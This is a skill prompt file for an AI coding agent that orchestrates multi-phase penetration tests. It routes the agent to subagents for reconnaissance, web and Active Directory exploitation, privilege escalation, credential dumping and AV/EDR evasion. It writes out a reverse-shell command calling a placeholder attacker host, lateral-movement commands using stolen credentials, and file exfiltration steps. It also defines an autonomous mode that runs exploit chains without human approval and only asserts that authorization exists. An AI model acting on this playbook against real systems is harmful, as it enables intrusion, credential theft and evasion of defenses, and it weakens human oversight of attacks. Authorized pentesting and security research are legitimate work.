---
name: orchestrator
description: >
  USE THIS SKILL when the user provides a target or list of targets (IPs,
  hostnames, URLs, subnets) and asks to attack, pentest, hack, scan, assess,
  or test them. Trigger phrases: "attack X", "pentest X", "hack X", "scan X",
  "start testing X", "pop X", "CTF target X", "engage X", "these targets".
  This is the entry point for all multi-phase penetration tests — handles
  recon, attack surface mapping, vulnerability chaining, and routes to
  technique skills for exploitation. Do NOT use when the user names a specific
  single technique (e.g., "run kerberoasting against X").
keywords:
  - pentest this target
  - start an engagement
  - scan this host
  - assess this network
  - attack this target
  - full pentest
  - start testing
  - engagement against
  - begin assessment
  - structured assessment
  - pentest orchestration
tools: []
opsec: medium
---

# Penetration Test Orchestrator

You are orchestrating a penetration test. Your job is to take a target,
establish scope, perform reconnaissance, map the attack surface, identify
vulnerabilities, chain them for maximum impact, and route to the correct
technique skills for exploitation. All testing is under explicit written
authorization.

> **DO NOT RUN SCANNING TOOLS.** The orchestrator's most common failure is
> running `nmap`, `ffuf`, `nuclei`, or `netexec` directly instead of routing
> to the correct skill. You are a router, not a scanner. If you are about to
> type `nmap`, route to **network-recon** instead. If you are about to type
> `ffuf`, route to **web-discovery** instead. See "Commands the Orchestrator
> May Execute Directly" below for the exhaustive allowed list.

## Skill Routing Is Mandatory

When this skill says "Route to **skill-name**", you MUST execute that skill
through a domain subagent (preferred) or inline via `get_skill()` (fallback).

### Primary Path: Subagent Delegation

1. Look up the skill in the **Skill-to-Agent Routing Table** (see Subagent
   Delegation section) to find the correct domain agent.
2. Spawn the agent via the Task tool with the skill name, target info, mode,
   and relevant context from the state summary.
3. Wait for the agent to return with findings.
4. Parse the return summary and record findings using state-writer MCP tools.

### Fallback Path: Inline Execution

If custom subagents are not installed (agent files missing from
`~/.claude/agents/`), fall back to inline execution:

1. Call `get_skill("skill-name")` to load the full skill from the MCP skill-router
2. Read the returned SKILL.md content
3. Follow its instructions end-to-end

### Core Principle

Do NOT execute techniques inline — even if the attack path seems obvious or you
already know the technique. Technique skills contain curated payloads, edge-case
handling, troubleshooting steps, and methodology that general knowledge lacks.
Skipping skill loading trades thoroughness for speed and risks missing things on
harder targets.

This applies in both guided and autonomous modes. Autonomous mode means you
make triage and routing decisions without asking — it does not mean you bypass
the skill library.

### Finding Skills

When you need a skill but don't know the exact name:
- `search_skills("description of what you need")` — semantic search, returns ranked matches
- `list_skills(category="web")` — browse all skills in a category

**Relevance validation**: Search results are ranked by embedding similarity, not
guaranteed relevance. Before loading a search result with `get_skill()`, verify
the returned description actually matches your scenario. If the top result looks
tangential, try a more specific query or browse with `list_skills()` instead.

### If the MCP Skill Router Is Unavailable

If `get_skill()`, `search_skills()`, or `list_skills()` return errors or are
not available as tools, **STOP**. Do not fall back to executing techniques
inline. Tell the user:

> MCP skill-router is not connected. Verify `.mcp.json` is configured and the
> server is running. If the index is missing, run:
> `uv run --directory tools/skill-router python indexer.py`
> then restart Claude Code.

### Commands the Orchestrator May Execute Directly

The orchestrator routes to skills — it does not run attack tools itself.
The only commands the orchestrator may execute directly are:

- `mkdir -p engagement/evidence/logs` — engagement directory creation
- File writes to `engagement/scope.md`, `engagement/activity.md`, `engagement/findings.md`
- State-writer MCP tools (`init_engagement`, `add_target`, `add_credential`, `add_access`, `add_vuln`, `add_pivot`, `add_blocked`, and their update variants) — engagement state
- State-reader MCP tools (`get_state_summary`, `get_targets`, `get_credentials`, `get_access`, `get_vulns`, `get_pivot_map`, `get_blocked`) — state queries
- Skill-router MCP tools (`get_skill`, `search_skills`, `list_skills`) — skill routing

Everything else — nmap, netexec, ffuf, nuclei, httpx, sqlmap, curl, any tool
that sends traffic to a target — MUST go through the appropriate skill.

**No pre-scan triage.** Do not run httpx, curl, or any "quick look" at the
target before network-recon completes. The orchestrator's job is to set up the
engagement directory, route to network-recon, and wait.

**If you are unsure whether a command is on the allowed list, it is not.
Route to a skill.**

### Subagent Delegation

The orchestrator delegates skill execution to **custom domain subagents** that
have full MCP access to the skill-router and category-specific servers. Each
subagent invocation executes **one skill** and returns — the orchestrator makes
every routing decision.

**Available subagents:**

| Agent | Domain | MCP Servers | Use For |
|-------|--------|-------------|---------|
| `network-recon-agent` | Network | skill-router, nmap-server, shell-server, state-reader | network-recon, smb-exploitation, pivoting-tunneling |
| `web-discovery-agent` | Web discovery | skill-router, shell-server, state-reader | web-discovery |
| `web-exploit-agent` | Web exploitation | skill-router, shell-server, state-reader | All web technique skills |
| `ad-discovery-agent` | AD discovery | skill-router, shell-server, state-reader | ad-discovery |
| `ad-exploit-agent` | AD exploitation | skill-router, shell-server, state-reader | All AD technique skills |
| `linux-privesc-agent` | Linux privesc | skill-router, shell-server, state-reader | Linux discovery + technique skills, container escapes |
| `windows-privesc-agent` | Windows privesc | skill-router, shell-server, state-reader | Windows discovery + technique skills |
| `evasion-agent` | AV/EDR evasion | skill-router, shell-server, state-reader | AV bypass payload generation |

**How to delegate:**

Spawn the appropriate domain agent via the Task tool:

```
Task(
    subagent_type="network-recon-agent",
    prompt="Load skill 'network-recon'. Target: 10.10.10.5. Mode: guided. No credentials provided.",
    description="Network recon on 10.10.10.5"
)
```

The agent will:
1. Call `get_skill("network-recon")` to load the skill
2. Follow the methodology, using MCP tools as needed (e.g., `nmap_scan`)
3. Report findings and return — the orchestrator records state changes and decides what to invoke next
4. Return a summary of findings and routing recommendations

**After every subagent return:**
1. Parse the agent's return summary for new targets, creds, access, vulns, pivots, blocked items
2. Call structured write tools to record findings (`add_target`, `add_credential`, `add_vuln`, etc.)
3. Append to `engagement/activity.md` with routing decision and skill outcome
4. Append to `engagement/findings.md` if vulnerabilities were confirmed
5. Call `get_state_summary()` and run the Step 5 decision logic
6. Spawn the next agent with the appropriate skill

**Each invocation = one skill.** Discovery skills find things and return.
The orchestrator decides which technique skill to invoke next. Subagents
never load a second skill or route to other skills — when the skill text says
"Route to X", that's the agent's cue to report findings and stop.

**Inline fallback:** If a custom subagent is not available (agent files not
installed), fall back to loading the skill inline via `get_skill()` and
executing the methodology in the main thread. The subagent model is the
preferred path, but the inline model still works.

#### Skill-to-Agent Routing Table

Use this table to pick the right agent for each skill:

| Skill | Agent | Why |
|-------|-------|-----|
| network-recon | network-recon-agent | Needs nmap MCP |
| smb-exploitation | network-recon-agent | Network-level exploitation |
| pivoting-tunneling | network-recon-agent | Network-level tools |
| web-discovery | web-discovery-agent | Web enumeration + attack surface mapping |
| sql-injection-union, sql-injection-blind, sql-injection-error, sql-injection-stacked | web-exploit-agent | Web |
| xss-reflected, xss-stored, xss-dom | web-exploit-agent | Web |
| ssti-twig, ssti-jinja2, ssti-freemarker | web-exploit-agent | Web |
| command-injection, python-code-injection | web-exploit-agent | Web |
| ajp-ghostcat | web-exploit-agent | Web (Tomcat AJP exploitation) |
| tomcat-manager-deploy | web-exploit-agent | Web (Tomcat Manager WAR deployment) |
| ssrf, lfi, file-upload-bypass, xxe | web-exploit-agent | Web |
| deserialization-java, deserialization-dotnet, deserialization-php | web-exploit-agent | Web |
| jwt-attacks, request-smuggling, nosql-injection, ldap-injection | web-exploit-agent | Web |
| idor, cors-misconfiguration, csrf | web-exploit-agent | Web |
| oauth-attacks, password-reset-poisoning, 2fa-bypass, race-condition | web-exploit-agent | Web |
| ad-discovery | ad-discovery-agent | AD enumeration + attack surface mapping |
| kerberos-roasting, kerberos-delegation, kerberos-ticket-forging | ad-exploit-agent | Kerberos attacks |
| adcs-template-abuse, adcs-access-and-relay, adcs-persistence | ad-exploit-agent | ADCS abuse |
| acl-abuse, credential-dumping, pass-the-hash, password-spraying | ad-exploit-agent | AD |
| gpo-abuse, trust-attacks, ad-persistence, auth-coercion-relay, sccm-exploitation | ad-exploit-agent | AD |
| linux-discovery | linux-privesc-agent | Linux host enum |
| linux-sudo-suid-capabilities, linux-cron-service-abuse, linux-file-path-abuse, linux-kernel-exploits | linux-privesc-agent | Linux privesc |
| container-escapes | linux-privesc-agent | Container context (Linux) |
| windows-discovery | windows-privesc-agent | Windows host enum |
| windows-token-impersonation, windows-service-dll-abuse, windows-uac-bypass | windows-privesc-agent | Windows privesc |
| windows-credential-harvesting, windows-kernel-exploits | windows-privesc-agent | Windows privesc |
| av-edr-evasion | evasion-agent | AV/EDR bypass payload generation |
| credential-cracking | _(inline — no agent needed)_ | Local-only, no target interaction |
| retrospective | _(inline — no agent needed)_ | Post-engagement, no target interaction |

#### Orchestrator Loop

The orchestrator runs a decision loop. Each iteration:

```
while objectives_not_met:
    summary = get_state_summary()
    analyze: unexploited vulns, unchained access, untested creds, pivot map
    pick highest-value next action → select skill + domain agent
    append to activity.md (routing decision)
    spawn agent with: skill name, target info, mode, context from summary
    agent returns: findings summary, routing recommendations
    parse return → call add_target/add_credential/add_vuln/etc.
    append to activity.md (outcome)
    append to findings.md (if vulns confirmed)
```

Each iteration is one skill invocation. The orchestrator never runs two skills
in parallel — sequential execution ensures state stays consistent.

#### Built-in Task Sub-Agents (Warning)

**Built-in** Task sub-agents (Explore, Plan, general-purpose) do NOT have MCP
access and cannot invoke skills. Never use them for target-level work:
- No scanning or enumeration tools against targets
- No exploiting vulnerabilities
- No post-exploitation or privilege escalation

**What built-in sub-agents may be used for:**
- Pure research (searching for CVE details, reading documentation)
- Local processing (parsing scan output, compiling exploits)
- Anything that does not require skill routing or target interaction

For hash cracking and encrypted file cracking, use the **credential-cracking**
skill (inline) instead of ad-hoc cracking in a built-in sub-agent.

### Pre-Routing Checkpoint

Before every skill invocation, append to
`engagement/activity.md` with current findings. Format:
```
### [YYYY-MM-DD HH:MM:SS] orchestrator → routing to <skill-name>
- State: <brief summary of what's known>
- Reason: <why this skill was chosen>
```

### Post-Skill Checkpoint

When a skill completes and returns control to the orchestrator:

1. Parse the subagent's return summary for new findings
2. Call structured write tools to record state changes:
   - New hosts/ports → `add_target()` / `add_port()`
   - New credentials → `add_credential()`
   - Credential test results → `test_credential()`
   - Access gained/changed → `add_access()` / `update_access()`
   - Vulnerabilities confirmed → `add_vuln()` / `update_vuln()`
   - Pivot paths identified → `add_pivot()`
   - Failed techniques → `add_blocked()`
3. Append to `engagement/activity.md` with skill outcome
4. Append to `engagement/findings.md` if vulnerabilities were confirmed
5. Call `get_state_summary()` for routing decision
6. Run the Step 5 decision logic
7. Route to the next skill based on updated state

Skills should NOT chain directly into other skills' scope areas. If a discovery
skill finds something outside its scope, it reports findings and returns — the
orchestrator records state changes and decides what to invoke next.

## Mode

Check if the user has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present it with a one-line explanation and wait for user approval.
  Present attack surface maps, chain analysis, and routing decisions — let the
  user choose which paths to pursue. Confirm before invoking each technique
  skill. Never execute multiple target-touching commands without approval
  between them.
- **Autonomous**: Execute recon through exploitation. Make triage decisions.
  Route to technique skills automatically. Report at phase boundaries and
  when significant access is gained.

If unclear, default to guided.

## Invocation Log

Immediately on activation — before scoping or doing any work — log invocation
to the screen:

1. **On-screen**: Print `[orchestrator] Activated → <target>` so the operator
   sees the engagement is starting.
2. **activity.md**: After creating the engagement directory in Step 1, append:
   ```
   ### [YYYY-MM-DD HH:MM:SS] orchestrator → <target>
   - Invoked (engagement starting)
   ```

**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
with date and second precision for timeline reconstruction.

This entry must be written as soon as the engagement directory exists.
Subsequent milestone entries append bullet points under this same header or
create new headers as phases progress.

## Step 1: Scope & Engagement Setup

### Define Scope

Gather from the user:
- **Targets**: IPs, hostnames, URLs, subnets, or domains in scope
- **Out of scope**: Hosts, services, or actions explicitly excluded
- **Credentials**: Any provided credentials, tokens, or API keys
- **Rules of engagement**: Testing windows, restricted techniques, notification
  requirements, OPSEC constraints
- **Objectives**: What does success look like? Domain admin? Data exfil proof?
  Specific system access?

### Initialize Engagement Directory

Create the engagement directory structure:

```bash
mkdir -p engagement/evidence/logs
```

**engagement/scope.md** — record scope from user input:

```markdown
# Engagement Scope

## Targets
- <targets from user>

## Out of Scope
- <exclusions>

## Credentials
- <provided creds>

## Rules of Engagement
- <constraints>

## Objectives
- <goals>
```

**engagement/state.db** — initialize via state-writer MCP:

Call `init_engagement(name="<engagement name>")` to create the SQLite state
database. This replaces the old state.md file.

**engagement/activity.md** — start the activity log:

```markdown
# Activity Log
```

**engagement/findings.md** — start the findings tracker:

```markdown
# Findings
```

## Step 2: Reconnaissance

Map the attack surface by routing to discovery skills via subagent delegation.
Do not run scanning or enumeration tools directly from the orchestrator.

### Network Recon (if IP/subnet in scope)

STOP. Spawn **network-recon-agent** with skill `network-recon`:

```
Task(
    subagent_type="network-recon-agent",
    prompt="Load skill 'network-recon'. Target: <IP/range>. Mode: <mode>. Credentials: <creds or 'none'>.",
    description="Network recon on <target>"
)
```

Do not execute nmap, masscan, or netexec commands inline. The agent has nmap
MCP access and will handle scanning directly.

Network-recon will:
1. Run host discovery (for subnets) and full port scanning
2. Enumerate services on each open port with quick-win checks (anonymous access,
   default creds, known CVEs)
3. Perform OS fingerprinting
4. Run vulnerability scanning (NSE scripts, nuclei)
5. Return routing recommendations for next steps

Wait for the agent to return before proceeding to attack surface mapping.

### Web Discovery (if HTTP/HTTPS found)

STOP. Spawn **web-discovery-agent** with skill `web-discovery`:

```
Task(
    subagent_type="web-discovery-agent",
    prompt="Load skill 'web-discovery'. Target: <URL>. Tech stack: <from recon>. Mode: <mode>.",
    description="Web discovery on <target>"
)
```

Do not execute ffuf, httpx, or nuclei commands inline.

### Host Enumeration (if domain environment suspected)

STOP. Spawn **ad-discovery-agent** with skill `ad-discovery`:

```
Task(
    subagent_type="ad-discovery-agent",
    prompt="Load skill 'ad-discovery'. DC: <IP>. Domain: <name>. Credentials: <creds>. Mode: <mode>.",
    description="AD discovery on <domain>"
)
```

Do not execute netexec or ldapsearch commands inline.

### Update State

After each agent returns, parse the return summary and record findings using
state-writer MCP tools (`add_target`, `add_port`, `add_credential`, `add_vuln`,
etc.). Then call `get_state_summary()` to check for new findings before routing
to the next skill.

Log to `engagement/activity.md`:
```markdown
### [YYYY-MM-DD HH:MM:SS] orchestrator → recon
- Routed to network-recon → N open ports found
- Web services found: <list>
- Technologies: <list>
- Domain environment: yes/no
```

## Step 3: Attack Surface Mapping

Based on recon results, categorize the attack surface:

| Surface | Indicators | Agent → Skill |
|---------|-----------|---------------|
| Web application | HTTP/HTTPS, login forms, APIs | web-discovery-agent → `web-discovery` |
| Active Directory | LDAP (389/636), Kerberos (88), SMB domain | ad-discovery-agent → `ad-discovery` |
| Containers / K8s | Docker API (2375), K8s API (6443/8443), kubelet (10250), etcd (2379), or inside a container | linux-privesc-agent → `container-escapes` |
| Database | MySQL (3306), MSSQL (1433), PostgreSQL (5432) | Direct DB testing |
| Mail | SMTP (25/587), IMAP (143/993) | Credential attacks, phishing |
| SMB vulnerability | SMB (445) + confirmed CVE (MS08-067, MS17-010, SMBGhost, MS09-050) | network-recon-agent → `smb-exploitation` |
| File shares | SMB (445), NFS (2049) | Enumeration, sensitive files |
| Remote access | SSH (22), RDP (3389), WinRM (5985/5986) | ad-exploit-agent → `password-spraying` |
| Custom services | Non-standard ports | Manual investigation |

**In guided mode**: Present the attack surface map and ask which paths to
pursue first. Recommend starting with the highest-value targets.

**In autonomous mode**: Prioritize by likely impact: web apps → AD → databases
→ other services.

## Step 4: Vulnerability Discovery & Exploitation

Route to discovery skills based on attack surface. Pass along:
- Target details (URL, IP, port, technology)
- Current mode (guided/autonomous)
- Any credentials from scope or already discovered

### Web Applications

STOP. Spawn **web-discovery-agent** with skill `web-discovery`. Pass: target
URL, technology stack, current mode, any credentials. Do not execute ffuf,
httpx, or nuclei commands inline.

### Active Directory

STOP. Spawn **ad-discovery-agent** with skill `ad-discovery`. Pass: DC IP,
domain name, any credentials, current mode. Do not execute netexec, ldapsearch,
or bloodhound commands inline.

### Credential Attacks

For services with authentication (SSH, RDP, SMB, web login):

STOP. Spawn **ad-exploit-agent** with skill `password-spraying`. Pass: target
IP, service type(s), any known usernames and passwords, current mode. Do not
execute netexec or hydra commands inline.

## Step 5: Vulnerability Chaining

This is the critical orchestrator function. Call `get_state_summary()` and
analyze the Pivot Map to chain vulnerabilities for maximum impact.

### Chaining Strategy

Think through these chains systematically:

**Direct Access (no credentials needed):**
- SMB vulnerability confirmed → network-recon-agent(`smb-exploitation`) → SYSTEM shell
- SMB exploitation → SYSTEM → ad-exploit-agent(`credential-dumping`) → lateral movement

**Information → Access:**
- LFI reads config → credentials → database/service access
- SSRF reaches internal service → metadata credentials → cloud access
- XXE reads files → SSH keys or passwords → host access
- SQLi dumps users table → password reuse → admin panel

**Access → Deeper Access:**

Common chains that produce shell access on a host:
- Web shell / backdoor with default or discovered credentials → shell access
- Database access → xp_cmdshell (MSSQL) / UDF (MySQL) / COPY TO/FROM PROGRAM
  (PostgreSQL) → OS command execution → shell access
- JWT forgery → admin panel → file upload → web shell → shell access
- Deserialization RCE → service account → shell access
- Command injection confirmed → shell access
- File upload bypass → web shell → shell access

> **Shell access gained → stabilize → host discovery routing (mandatory).**
>
> When any chain above produces command execution on a host, follow this
> sequence before doing anything else:
>
> **1. Stabilize access — get an interactive shell via shell-server.**
> A webshell, blind RCE callback, or database command execution is NOT a stable
> shell. Before routing to discovery, catch a reverse shell using the MCP
> shell-server:
> 1. Call `start_listener(port=<port>)` to prepare a catcher on the attackbox
> 2. Send a reverse shell payload through the current access method:
>    - Linux: `bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`, python, or nc
>    - Windows: PowerShell reverse shell, nc.exe, or `nishang/Invoke-PowerShellTcp.ps1`
> 3. Call `list_sessions()` to verify the connection arrived
> 4. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
>
> If the target has no outbound connectivity, fall back to inline command
> execution and note the limitation via `add_blocked()`. If the subagent has
> shell-server MCP access, it can call these tools directly.
>
> **1b. Credential-based access — use `start_process`.**
> When the chain produces credentials rather than a callback, and the
> relevant service port is open (check engagement state):
> 1. WinRM (5985/5986): `start_process(command="evil-winrm -i TARGET -u user -p pass")`
> 2. SMB (445): `start_process(command="psexec.py DOMAIN/user:pass@TARGET")`
> 3. WMI (135): `start_process(command="wmiexec.py DOMAIN/user:pass@TARGET")`
> 4. SSH (22): `start_process(command="ssh user@TARGET")`
> 5. Verify: `send_command(session_id=..., command="whoami")`
> 6. Route to discovery as with reverse shells
>
> **Decision:** Have credentials + service port open? → `start_process`.
> Need callback from RCE? → `start_listener`.
>
> **File transfer via evil-winrm:** When WinRM is available (5985/5986 open),
> prefer evil-winrm for transferring tools and scripts to Windows targets.
> Its `upload`/`download` commands are more reliable than SMB file transfer.
>
> **2. Route to the appropriate discovery skill.**
> Do NOT run `sudo -l`, `find -perm -4000`, `whoami /priv`, `net user`, or any
> host enumeration commands inline. Spawn:
>
> - Linux target → STOP. Spawn **linux-privesc-agent** with skill `linux-discovery`.
> - Windows target → STOP. Spawn **windows-privesc-agent** with skill `windows-discovery`.
>
> Pass: target hostname/IP, current user, access method (specify: interactive
> reverse shell on port X, SSH session, WinRM, etc.), current mode, any
> credentials. The discovery skill enumerates systematically and returns findings
> — the orchestrator then decides which technique skill to invoke next (sudo/SUID
> abuse, cron/MOTD exploitation, kernel exploits, token impersonation, etc.).
>
> This applies every time new shell access is gained — including after lateral
> movement to a new host.
>
> **File exfiltration:** When retrieving files from a target (loot, backups,
> configs, databases), follow the File Exfiltration decision tree in the skill
> template — prefer direct download (HTTP, SCP, SMB) over base64 encoding.

**Lateral Movement:**
- Credentials from one host → test against all others in scope
- Service account → ad-exploit-agent(`kerberos-roasting`) → more credentials
- Machine keys from IIS → ViewState RCE on other IIS sites
- Database link → linked server → second database
- Host access on new subnet → network-recon-agent(`pivoting-tunneling`) → then network-recon-agent(`network-recon`) on internal network

**Privilege Escalation:**
- Local admin → ad-exploit-agent(`credential-dumping`) → domain user
- Domain user → ad-exploit-agent(`kerberos-roasting`) → service accounts
- Service account → ad-exploit-agent(`kerberos-delegation`) → domain admin
- ADCS misconfiguration → ad-exploit-agent(`adcs-template-abuse`/`adcs-access-and-relay`) → domain admin
- Containerized shell → linux-privesc-agent(`container-escapes`) → host access → linux-privesc-agent(`linux-discovery`)/windows-privesc-agent(`windows-discovery`)

### Decision Logic

When reading the state summary (via `get_state_summary()`), the orchestrator should:

1. **Check for unexploited vulns** — spawn the appropriate agent with the
   technique skill (look up in Skill-to-Agent Routing Table)
2. **Check for shell access without root/SYSTEM** — if the Access section shows
   a non-root shell on Linux or non-SYSTEM/non-admin shell on Windows, spawn
   **linux-privesc-agent** with `linux-discovery` or **windows-privesc-agent**
   with `windows-discovery`. Do not enumerate privilege escalation vectors
   inline.
3. **Check for unchained access** — can existing access reach new targets?
4. **Check credentials** — have all found credentials been tested against all
   services?
5. **Check for uncracked hashes** — if the Credentials section contains hashes
   without plaintext (NTLM, Kerberos TGS, shadow, etc.) or the engagement has
   encrypted files (ZIP, Office, KeePass, SSH key), load **credential-cracking**
   inline via `get_skill("credential-cracking")`. Cracked passwords unlock new
   testing against all services.
6. **Check pivot map** — are there identified paths not yet followed?
7. **Check blocked items** — has anything changed that might unblock a
   previously failed technique?
8. **Assess progress toward objectives** — are we closer to the goal defined
   in scope.md?
9. **No hardcoded route matches** — if the scenario doesn't match any routing
   above, use dynamic search:
   a. Call `search_skills("description of what you need")` — results below 0.4
      similarity are filtered automatically.
   b. **Validate before loading**: Read the returned description for each
      result. Does it match the current scenario? A high similarity score
      does not guarantee relevance — the embedding model can confuse adjacent
      techniques (e.g., SSRF/CSRF, IDOR/ACL-abuse). If the description
      doesn't fit, skip it and check the next result or try a different query.
   c. Look up the skill in the Skill-to-Agent Routing Table and spawn the
      appropriate domain agent. If the skill isn't in the table, determine
      the domain (web/ad/privesc/network) from its category and use the
      corresponding agent.
   d. If no search result is relevant, proceed with general methodology and
      note the coverage gap in `engagement/activity.md`.

### Clock Skew Recovery

When an AD skill returns with `KRB_AP_ERR_SKEW` or clock skew as the failure
reason:

1. Write a temporary script to the working directory:
   ```bash
   #!/usr/bin/env bash
   set -euo pipefail
   # Sync attackbox clock with domain controller
   DC_IP="<DC_IP from engagement state>"
   sudo ntpdate "$DC_IP" || sudo rdate -n "$DC_IP"
   echo "[+] Clock synced with $DC_IP"
   ```
   Save as `temp_clock-sync.sh` and `chmod +x temp_clock-sync.sh`.
2. Present to the user:
   > Clock skew detected — Kerberos authentication requires clocks within 5
   > minutes of the DC. Run `sudo ./temp_clock-sync.sh` to sync, then confirm.
3. In **autonomous mode**: Write the script and tell the user to run it. Wait
   for confirmation before retrying. This is one of the few cases where
   autonomous mode must pause for operator intervention (sudo requirement).
4. After user confirms clock is synced, retry the **same skill invocation**
   with identical parameters (same agent, same skill, same target context).
5. Clean up: `rm temp_clock-sync.sh` after successful retry.
6. Log to `engagement/activity.md`:
   ```
   ### [YYYY-MM-DD HH:MM:SS] orchestrator → clock-skew recovery
   - KRB_AP_ERR_SKEW detected during <skill-name>
   - Clock synced via ntpdate, retrying skill
   ```

### AV Evasion Recovery

When a technique agent returns with an "AV/EDR Blocked" section in its summary:

1. Record the blocked technique via `add_blocked()`:
   - technique: the original skill name
   - reason: "Payload caught by AV/EDR: \<details from agent return\>"
   - host: target host
   - retry: "with_context" (retryable after evasion)

2. Spawn **evasion-agent** with skill `av-edr-evasion`:
   ```
   Task(
       subagent_type="evasion-agent",
       prompt="Load skill 'av-edr-evasion'. Context: <paste AV-blocked section
       from agent return>. Build an AV-safe payload that meets the requirements.
       Target: <IP>. Mode: <mode>.",
       description="AV evasion for <technique> on <target>"
   )
   ```

3. When evasion-agent returns with bypass artifact:
   - Record the bypass method in `engagement/activity.md`
   - Re-invoke the **original agent** with the **same skill** plus evasion context:
     ```
     Task(
         subagent_type="<original-agent>",
         prompt="Load skill '<original-skill>'. Target: <IP>. Mode: <mode>.
         IMPORTANT: Your previous payload was caught by AV. Use this AV-safe
         payload instead: <artifact path>. Method: <bypass method>.
         Runtime prerequisites: <if any, e.g., AMSI bypass command>.
         Do NOT generate a new payload — use the provided one.",
         description="Retry <technique> with AV-safe payload on <target>"
     )
     ```

4. If the evasion agent itself fails (no bypass found), record as permanently
   blocked via `add_blocked()` with retry: "no" and move to the next attack
   vector.

5. Log to `engagement/activity.md`:
   ```
   ### [YYYY-MM-DD HH:MM:SS] orchestrator → av-evasion recovery
   - AV blocked <skill-name> on <target>: <detection details>
   - Routed to evasion-agent → <outcome>
   ```

**In guided mode**: Present the chain analysis and recommend next steps.
Show the reasoning: "We have SQLi on the web app. We could extract credentials
and test them against SMB, or we could try to get command execution via
stacked queries."

**In autonomous mode**: Execute the highest-impact chain automatically.
Report at each milestone.

## Step 6: Post-Exploitation

When significant access is gained (shell, domain admin, database):

1. **Collect evidence** — save proof to `engagement/evidence/`
2. **Update state** — call state-writer MCP tools to record new access, credentials, and vulns
3. **Check objectives** — have we met the engagement goals?
4. **Continue or wrap up** — if objectives met, move to reporting. If not,
   continue chaining.

### Evidence Collection

**Important — Windows path quoting:** Paths with spaces (e.g.,
`C:\Documents and Settings\`) must use double quotes in cmd.exe. Without
quotes, cmd.exe splits on spaces and the command fails.

```bash
# On compromised host — collect proof
whoami /all
ipconfig /all
systeminfo

# Domain info if applicable
net user /domain
net group "Domain Admins" /domain

# Flags (quote paths with spaces — especially Windows XP)
type "C:\Documents and Settings\<user>\Desktop\user.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
# Or on Vista+:
type C:\Users\<user>\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

Save output to `engagement/evidence/` with descriptive filenames.

## Step 7: Multi-Target Engagements

When the scope includes multiple targets (multiple IPs, a subnet, a CTF with
several boxes), the orchestrator must process them methodically. Each subagent
invocation has isolated context, which prevents context pollution across
targets — but all routing decisions still flow through the orchestrator.

### Strategy: Phase-Based Cycling

Process all targets through the same phase before advancing, rather than
completing one target end-to-end before starting another. This enables
cross-pollination of discoveries (credentials from target A tested against
target B) and strategic prioritization.

**Phase 1 — Recon all targets:**
Invoke **network-recon** for each target (or once for the full scope). Build
the complete attack surface map in the engagement state before choosing where to attack.

**Phase 2 — Triage and prioritize:**
After recon, rank targets by exploitability:
1. Known CVEs with public exploits
2. Default/anonymous access (unauthenticated DB, open shares)
3. Web applications with discoverable attack surface
4. Services requiring credential attacks

**Phase 3 — Work the highest-value target:**
Route through discovery → technique skills for the top-priority target. When
you gain access or get blocked, record state changes via state-writer MCP and move to the next target.

**Phase 4 — Cross-pollinate:**
After each target yields credentials or access, check the engagement state for
opportunities on other targets:
- New creds → test against all targets with matching services
- New network access → check for internal-only services on other targets
- Patterns (same OS, same app framework) → apply same technique

**Phase 5 — Cycle back:**
Revisit blocked targets with new information. Repeat until all targets are
exhausted or objectives are met.

### What NOT To Do

- **Do not spawn built-in Task sub-agents (Explore, Plan, general-purpose) per
  target.** They lack MCP access and cannot invoke skills. Use only the custom
  domain subagents listed in the Skill-to-Agent Routing Table.
- **Do not go deep on one target while ignoring others.** If you're stuck on
  privesc for target A, move to target B. Fresh targets often yield quick wins
  that unlock progress elsewhere.
- **Do not run the same skill on multiple targets simultaneously.** Invoke
  agents one at a time. The sequential overhead is the price of methodology and
  consistent state management.

### State Management for Multiple Targets

The engagement state database tracks all targets in structured tables. Use the
state-reader MCP tools to query across targets:

- `get_state_summary()` — full overview of all targets, access, credentials,
  vulns, and pivot paths in one view
- `get_targets()` — list all discovered hosts with ports and services
- `get_credentials(untested_only=true)` — find credentials that haven't been
  tested against all services yet

After each skill invocation, check ALL targets for newly actionable state —
not just the target that was just worked on.

## Step 8: Reporting

When the engagement is complete (objectives met or testing window closed):

1. Call `get_state_summary()` for the full picture
2. Read `engagement/findings.md` for confirmed vulnerabilities
3. Summarize the attack narrative — how each chain progressed
4. Write up each finding in `engagement/findings.md` with severity, impact, evidence path, and reproduction steps.

### Engagement Summary Template

```markdown
# Engagement Summary

## Scope
<from scope.md>

## Attack Narrative
<Chronological story of the engagement: recon → initial access → pivoting →
objective completion>

## Key Findings
<Top findings by severity, with brief description and impact>

## Attack Chains
<Diagram or description of how vulnerabilities were chained>

## Recommendations
<Prioritized remediation guidance>
```

### Retrospective

After presenting the engagement summary, suggest running a retrospective:

> Engagement complete. Want to run a retrospective? It reviews skill routing
> decisions, identifies payload and methodology gaps, and produces actionable
> improvements to make the skills work better for you next time.

If the user agrees, route to **retrospective** — call `get_skill("retrospective")`
and follow its instructions.

## OPSEC Notes

- Recon phase (nmap, httpx) is relatively low-OPSEC but generates network
  traffic — use `-T2` or `--rate` flags if stealth is required
- Credential spraying can trigger lockouts — always check lockout policy first
- Technique skills have their own OPSEC ratings — check before routing
- In OPSEC-sensitive engagements, prefer passive recon and targeted testing
  over broad scanning

## Troubleshooting

### No Web Services Found

- Check if HTTP is on non-standard ports: `nmap -p- TARGET`
- Check for HTTPS-only: `nmap -sV -p 443,8443,8080,4443 TARGET`
- Check for virtual hosts: requires hostname, not just IP

### Credentials Not Working Across Services

- Different password policies per service
- Account may be disabled on target service
- Kerberos vs NTLM authentication differences
- Check for MFA on target service

### Stuck — No Clear Next Step

- Call `get_state_summary()` — look for unchained access or untested creds
- Check Blocked section — has context changed?
- Try broader recon: full port scan, UDP scan, subdomain enumeration
- Check for default credentials on discovered services
- Look for information disclosure: error pages, directory listings, exposed configs
